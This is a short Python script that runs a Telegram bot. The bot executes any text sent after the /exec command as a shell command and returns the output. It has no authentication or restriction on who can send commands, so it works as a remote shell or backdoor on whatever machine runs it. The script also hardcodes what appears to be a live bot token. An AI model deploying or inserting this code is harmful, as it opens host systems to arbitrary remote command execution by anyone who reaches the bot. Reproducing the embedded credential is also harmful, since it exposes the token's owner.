import telebot
import subprocess
token = "6829754517:AAGKEhV2_PsQ99DaLPSYFPrZMXNhzCqJAdM"

bot = telebot.TeleBot(token)

@bot.message_handler(commands=['exec'])
def execute_command(message):
    print (message.chat.id)
    try:
        result = subprocess.getoutput(message.text[6:])
        bot.reply_to(message, "Result:\n" + result)
    except Exception as e:
        bot.reply_to(message, "An error occurred:\n" + str(e))

bot.polling()